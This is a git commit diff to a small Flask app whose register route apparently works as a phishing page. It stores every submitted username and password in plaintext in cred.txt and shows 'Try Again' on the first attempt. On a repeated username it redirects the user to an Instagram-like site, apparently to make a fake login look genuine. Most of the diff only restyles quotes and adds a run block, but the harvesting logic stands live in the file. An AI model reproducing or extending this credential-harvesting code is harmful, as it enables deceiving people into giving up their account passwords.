37cab5e36293be759d9f313c42e90b2e0cbe440c
Faridin Islam <faridin05saif@gmail.com>
2025-07-07 18:05:11 +0600

    inisdasd

--- app.py
+++ app.py
@@ -5,25 +5,32 @@ from flask import Flask, redirect, render_template, request
 app = Flask(__name__)
 last_uname = ""
 
-@app.route('/')
+
+@app.route("/")
 def hello_world():
     return render_template("index.html")
 
-@app.route('/register', methods=["GET", "POST"])
+
+@app.route("/register", methods=["GET", "POST"])
 def register():
     global last_uname
     if request.method == "POST":
         with open("cred.txt", "a+") as f:
             data = {}
-            data["uname"] = request.form.get('uname')
-            data["pass"] = request.form.get('pass')
+            data["uname"] = request.form.get("uname")
+            data["pass"] = request.form.get("pass")
             json.dump(data, f)
             if last_uname == "":
-                last_uname = request.form.get('uname')
-            elif last_uname == request.form.get('uname'):
+                last_uname = request.form.get("uname")
+            elif last_uname == request.form.get("uname"):
                 return redirect("https://myinsta.app/")
-            
-        return render_template('register.html', msg="Try Again")
-    
+
+        return render_template("register.html", msg="Try Again")
+
         # return redirect("https://myinsta.app/")
-    return render_template('register.html', msg="")
+    return render_template("register.html", msg="")
+
+
+if __name__ == "__main__":
+    app.run(debug=False, port=8000)
+
